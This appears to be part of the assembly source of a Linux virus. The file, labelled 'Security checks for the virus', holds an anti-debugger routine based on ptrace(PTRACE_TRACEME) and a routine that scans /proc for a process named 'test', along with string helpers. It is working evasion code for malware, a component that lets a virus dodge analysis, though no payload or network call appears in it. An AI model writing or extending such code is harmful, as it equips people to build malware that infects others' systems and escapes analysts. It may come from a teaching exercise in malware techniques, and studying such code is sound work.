; ============================================
; Security checks for the virus
; - Anti-debugger detection
; - Process name checking
; ============================================

; ============================================
; check_debugger - Detect if program is being debugged
; Returns: rax = 1 if debugger detected, 0 if not
;
; How it works:
; Uses ptrace(PTRACE_TRACEME, 0, 0, 0) syscall
; If a debugger is already attached, ptrace returns -1 (EPERM)
; If no debugger, ptrace returns 0 (success)
; ============================================
check_debugger:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    ; Call ptrace(PTRACE_TRACEME, 0, 0, 0)
    mov eax, SYS_PTRACE         ; syscall number 101
    mov edi, PTRACE_TRACEME     ; request = PTRACE_TRACEME (0)
    xor esi, esi                ; pid = 0
    xor edx, edx                ; addr = 0
    xor r10d, r10d              ; data = 0
    syscall
    
    ; If rax == -1, debugger is attached
    ; If rax == 0, no debugger
    cmp rax, -1
    je .debugger_detected
    
    ; No debugger
    xor rax, rax
    jmp .check_done
    
.debugger_detected:
    mov rax, 1
    
.check_done:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================
; check_process_running - Check if process named "test" is running
; Returns: rax = 1 if "test" process found, 0 if not
;
; How it works:
; 1. Opens /proc directory
; 2. Iterates through each entry (process ID directories)
; 3. For numeric entries, opens /proc/PID/comm file
; 4. Reads the process name and compares with "test"
; ============================================
check_process_running:
    push rbp
    mov rbp, rsp
    sub rsp, 4352               ; Stack space for buffers
    push r12                    ; fd for /proc
    push r13                    ; current position
    push r14                    ; bytes read
    push r15                    ; temp
    push rbx
    
    ; Open /proc directory
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rel sec_proc_dir_path]
    mov edx, O_RDONLY | O_DIRECTORY
    xor r10d, r10d
    syscall
    
    test rax, rax
    js .no_test_process         ; Failed to open /proc
    
    mov r12, rax                ; save fd
    
.read_proc_loop:
    ; Read directory entries
    mov eax, SYS_GETDENTS64
    mov edi, r12d
    lea rsi, [rbp-4224]         ; buffer on stack
    mov edx, 4096
    syscall
    
    test rax, rax
    jle .close_proc_dir         ; EOF or error
    
    mov r14, rax                ; save bytes read
    xor r13, r13                ; position = 0
    
.process_entry:
    cmp r13, r14
    jge .read_proc_loop
    
    lea rdi, [rbp-4224]
    add rdi, r13                ; current dirent
    
    ; Get d_reclen (offset 16)
    movzx r15, word [rdi + 16]
    
    ; Get d_name (offset 19)
    lea rsi, [rdi + 19]
    
    ; Skip . and ..
    cmp byte [rsi], '.'
    je .next_proc_entry
    
    ; Check if entry name is numeric (process ID)
    call is_numeric
    test rax, rax
    jz .next_proc_entry
    
    ; Build path: /proc/PID/comm
    lea rdi, [rbp-4352]         ; path buffer
    lea rsi, [rel sec_proc_dir_path]
    call virus_str_copy_local
    
    lea rdi, [rbp-4352]
    call str_len_local
    lea rdi, [rbp-4352]
    add rdi, rax
    
    ; Add PID
    lea rdx, [rbp-4224]
    add rdx, r13
    lea rsi, [rdx + 19]         ; d_name
    call virus_str_copy_local
    
    ; Add /comm
    lea rdi, [rbp-4352]
    call str_len_local
    lea rdi, [rbp-4352]
    add rdi, rax
    lea rsi, [rel sec_proc_comm_path]
    call virus_str_copy_local
    
    ; Try to open /proc/PID/comm
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rbp-4352]
    mov edx, O_RDONLY
    xor r10d, r10d
    syscall
    
    test rax, rax
    js .next_proc_entry         ; Failed to open
    
    mov r15, rax                ; save comm fd
    
    ; Read process name
    mov eax, SYS_READ
    mov edi, r15d
    lea rsi, [rbp-4300]         ; small buffer for process name
    mov edx, 64
    syscall
    
    push rax                    ; save bytes read
    
    ; Close comm file
    mov eax, SYS_CLOSE
    mov edi, r15d
    syscall
    
    pop rax
    test rax, rax
    jle .next_proc_entry
    
    ; Compare with "test"
    lea rdi, [rbp-4300]
    lea rsi, [rel sec_test_proc_name]
    mov rcx, 4                  ; length of "test"
    call str_compare_n
    test rax, rax
    jnz .test_process_found
    
.next_proc_entry:
    lea rax, [rbp-4224]
    add rax, r13
    movzx r15, word [rax + 16]  ; d_reclen
    add r13, r15
    jmp .process_entry
    
.close_proc_dir:
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
.no_test_process:
    xor rax, rax                ; not found
    jmp .check_proc_done
    
.test_process_found:
    ; Close /proc dir
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
    mov rax, 1                  ; found
    
.check_proc_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    add rsp, 4352
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Helper: is_numeric - Check if string is numeric
; rsi = string pointer
; Returns: rax = 1 if numeric, 0 if not
; ============================================
is_numeric:
    push rsi
    
    ; Check if first char is a digit
    movzx eax, byte [rsi]
    test al, al
    jz .not_numeric             ; empty string
    
    cmp al, '0'
    jb .not_numeric
    cmp al, '9'
    ja .not_numeric
    
    ; At least first char is numeric, good enough for PID check
    mov rax, 1
    jmp .is_num_done
    
.not_numeric:
    xor rax, rax
    
.is_num_done:
    pop rsi
    ret

; ============================================
; Helper: virus_str_copy_local - Copy string
; rdi = dest, rsi = src
; ============================================
virus_str_copy_local:
    push rax
.copy_loop:
    lodsb
    stosb
    test al, al
    jnz .copy_loop
    pop rax
    ret

; ============================================
; Helper: str_len_local - Get string length
; rdi = string
; Returns: rax = length
; ============================================
str_len_local:
    push rdi
    xor rax, rax
.len_loop:
    cmp byte [rdi], 0
    je .len_done
    inc rdi
    inc rax
    jmp .len_loop
.len_done:
    pop rdi
    ret

; ============================================
; Helper: str_compare_n - Compare first n bytes
; rdi = str1, rsi = str2, rcx = n
; Returns: rax = 1 if equal, 0 if not
; ============================================
str_compare_n:
    push rbx
    push rcx
    
    xor rbx, rbx
.cmp_loop:
    cmp rbx, rcx
    jge .strings_equal
    
    movzx eax, byte [rdi + rbx]
    movzx edx, byte [rsi + rbx]
    cmp eax, edx
    jne .strings_not_equal
    
    inc rbx
    jmp .cmp_loop
    
.strings_equal:
    mov rax, 1
    jmp .cmp_done
    
.strings_not_equal:
    xor rax, rax
    
.cmp_done:
    pop rcx
    pop rbx
    ret
